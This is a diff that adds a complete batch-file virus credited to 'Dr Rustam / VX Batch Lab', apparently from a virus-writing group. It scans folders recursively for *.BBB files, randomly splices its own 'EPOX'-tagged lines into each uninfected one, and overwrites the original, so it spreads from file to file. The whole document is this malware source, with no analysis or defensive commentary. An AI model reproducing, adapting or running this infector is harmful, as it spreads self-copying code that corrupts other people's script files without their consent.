@@ -1,0 +1,29 @@
+
+%EPOX%SET FFF=%0
+@FOR /R %%T IN (*.BBB) DO SET DFG=%%T&CALL :EPOX1
+GOTO EPOX0
+:EPOX1
+SET /A EPOXR=1+(15-1+1) * %RANDOM%/32768
+%EPOX%FOR /F "TOKENS=1*" %%A IN (%DFG%) DO (
+%EPOX%SET STR=%%A %%B
+CALL :EPOXL
+%EPOX%)
+FIND "EPOX" <%FFF%>>TMP
+MORE +%EPOXR% < %DFG% >>TMP
+GOTO EPOXI
+:EPOXL
+%EPOX%SET /A SN=%SN%+1
+IF %SN% LEQ %EPOXR% (ECHO %STR% >>TMP)
+%EPOX%GOTO :EOF
+:EPOXI
+FIND "EPOX" <%DFG%>NUL
+%EPOX%IF ERRORLEVEL 1 MOVE TMP %DFG%
+:EPOX0 % By Dr Rustam %
+
+
+
+--------------------------------------------------
+
+====-------=-==-===-----==
+| DR RUSTAM/VX BATCH LAB |
+====--=-====-----=-=-====-
